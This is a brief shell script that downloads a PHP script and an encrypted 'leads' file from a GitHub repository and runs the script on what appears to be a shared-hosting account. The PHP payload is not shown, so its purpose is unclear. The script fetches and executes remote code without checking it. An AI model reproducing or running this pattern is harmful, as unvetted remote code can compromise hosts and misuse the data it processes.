#!/bin/sh
D=/home/u791571885/dgs64; mkdir -p $D; cd $D || exit 1
[ -f out.txt ] && { cat out.txt; exit 0; }
[ -f started ] && { echo running; exit 0; }
: > started
curl -fsSL -o vs64.php "https://raw.githubusercontent.com/a04032417-svg/Dar/$1/vs64.php"
curl -fsSL -o leads64.enc "https://raw.githubusercontent.com/a04032417-svg/Dar/$1/leads64.enc"
/opt/alt/php83/usr/bin/php vs64.php "$2" > out.tmp 2>&1; mv out.tmp out.txt; cat out.txt
